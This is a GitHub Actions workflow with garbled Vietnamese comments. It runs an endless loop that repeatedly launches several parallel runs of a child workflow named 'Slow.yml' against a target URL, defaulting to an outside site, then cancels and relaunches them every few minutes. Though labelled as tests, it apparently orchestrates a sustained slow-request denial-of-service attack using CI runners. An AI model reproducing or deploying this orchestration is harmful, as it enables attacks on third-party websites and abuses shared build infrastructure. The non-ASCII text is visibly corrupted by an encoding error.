# ‚úÖ File: .github/workflows/SlowContro.yml
# WORKFLOW ƒêI·ªÄU KHI·ªÇN (PHI√äN B·∫¢N CU·ªêI C√ôNG - D√ôNG ID S·ªê)

name: üîÑ ƒêi·ªÅu Khi·ªÉn V√≤ng L·∫∑p Slow (B·∫£n ID S·ªë)

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'URL m·ª•c ti√™u cho c√°c l·∫ßn test'
        required: true
        default: 'https://certapple.com'
      wait_minutes:
        description: 'S·ªë ph√∫t ch·ªù tr∆∞·ªõc khi kh·ªüi ƒë·ªông l·∫°i'
        required: true
        default: '6'
      child_runs:
        description: 'S·ªë action con (Slow.yml) ƒë∆∞·ª£c kh·ªüi ch·∫°y trong m·ªói chu k·ª≥'
        required: true
        default: '5'

jobs:
  loop_controller:
    name: üîÑ V√≤ng L·∫∑p ƒêi·ªÅu Khi·ªÉn
    runs-on: ubuntu-latest
    
    permissions:
      actions: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p v√¥ t·∫≠n
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARGET_URL: ${{ github.event.inputs.target_url }}
          WAIT_MINUTES: ${{ github.event.inputs.wait_minutes }}
          CHILD_RUNS: ${{ github.event.inputs.child_runs }}
        run: |
          set -e
          
          WAIT_SECONDS=$(($WAIT_MINUTES * 60))

          echo "B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p ƒëi·ªÅu khi·ªÉn..."
          echo "URL m·ª•c ti√™u: $TARGET_URL"
          echo "S·ªë l·∫ßn ch·∫°y con m·ªói v√≤ng: $CHILD_RUNS"
          echo "Th·ªùi gian ch·ªù m·ªói v√≤ng: $WAIT_MINUTES ph√∫t ($WAIT_SECONDS gi√¢y)"

          # B∆Ø·ªöC 1: L·∫§Y ID D·∫†NG S·ªê C·ª¶A WORKFLOW CON
          echo "ƒêang l·∫•y ID c·ªßa workflow 'Slow.yml'..."
          WORKFLOW_ID=$(gh workflow view Slow.yml --json id --jq .id)
          if ! [[ "$WORKFLOW_ID" =~ ^[0-9]+$ ]]; then
            echo "‚ÄºÔ∏è L·ªói nghi√™m tr·ªçng: Kh√¥ng th·ªÉ t√¨m th·∫•y ID c·ªßa workflow 'Slow.yml'. Vui l√≤ng ki·ªÉm tra l·∫°i t√™n file."
            exit 1
          fi
          echo "‚úÖ ƒê√£ l·∫•y ƒë∆∞·ª£c ID c·ªßa workflow 'Slow.yml': $WORKFLOW_ID"

          while true; do
            echo "-----------------------------------------------------"
            echo "üöÄ B·∫Øt ƒë·∫ßu kh·ªüi ch·∫°y $CHILD_RUNS actions..."
            
            # Ch√∫ng ta d√πng ID s·ªë ƒë·ªÉ k√≠ch ho·∫°t, ƒë√°ng tin c·∫≠y h∆°n
            for i in $(seq 1 $CHILD_RUNS); do
              gh workflow run $WORKFLOW_ID --ref ${{ github.ref }} -f target_url="$TARGET_URL"
              echo "-> ƒê√£ g·ª≠i y√™u c·∫ßu k√≠ch ho·∫°t l·∫ßn ch·∫°y th·ª© $i"
            done

            echo "üîç L·∫•y ID c·ªßa c√°c l·∫ßn ch·∫°y m·ªõi (th·ª≠ t·ªëi ƒëa 5 l·∫ßn)..."
            RUN_IDS=""
            for attempt in $(seq 1 5); do
              echo "L·∫ßn th·ª≠ $attempt..."
              sleep 10
              
              # B∆Ø·ªöC 2: D√ôNG ID S·ªê ƒê·ªÇ LIST RUNS
              RUN_IDS=$(gh run list --workflow=$WORKFLOW_ID --json databaseId,status,createdAt --limit $(($CHILD_RUNS + 5)) \
                --jq --argjson num_runs "$CHILD_RUNS" '[.[] | select(.status=="queued" or .status=="in_progress")] | sort_by(.createdAt) | reverse | .[0:$num_runs] | .[].databaseId' | tr '\n' ' ')

              if [ -n "$RUN_IDS" ]; then
                echo "‚úÖ L·∫•y ID th√†nh c√¥ng ·ªü l·∫ßn th·ª≠ th·ª© $attempt."
                break
              else
                echo "‚ö†Ô∏è Kh√¥ng t√¨m th·∫•y ID, ƒëang th·ª≠ l·∫°i sau 10 gi√¢y..."
              fi
            done
            
            if [ -z "$RUN_IDS" ]; then
                echo "‚ÄºÔ∏è L·ªói: Sau 5 l·∫ßn th·ª≠ v·∫´n kh√¥ng l·∫•y ƒë∆∞·ª£c ID. S·∫Ω b·ªè qua chu k·ª≥ n√†y."
            else
                echo "‚úÖ ƒê√£ l·∫•y ƒë∆∞·ª£c danh s√°ch ID ƒë·ªÉ h·ªßy: $RUN_IDS"
            fi

            echo "‚è≥ Ch·ªù $WAIT_SECONDS gi√¢y ($WAIT_MINUTES ph√∫t)..."
            sleep $WAIT_SECONDS

            if [ -n "$RUN_IDS" ]; then
              echo "üõë Ng·ª´ng $CHILD_RUNS actions c≈©..."
              for id in $RUN_IDS; do
                echo "-> ƒêang g·ª≠i l·ªánh h·ªßy cho run ID: $id"
                gh run cancel $id || echo "L·ªói khi h·ªßy run ID $id (c√≥ th·ªÉ n√≥ ƒë√£ k·∫øt th√∫c)."
              done
              echo "‚úÖ ƒê√£ g·ª≠i l·ªánh h·ªßy."
            else
              echo "‚ÑπÔ∏è Kh√¥ng c√≥ ID n√†o ƒë·ªÉ h·ªßy trong chu k·ª≥ n√†y."
            fi
            
            echo "üîÑ Chu·∫©n b·ªã cho v√≤ng l·∫∑p ti·∫øp theo..."
          done
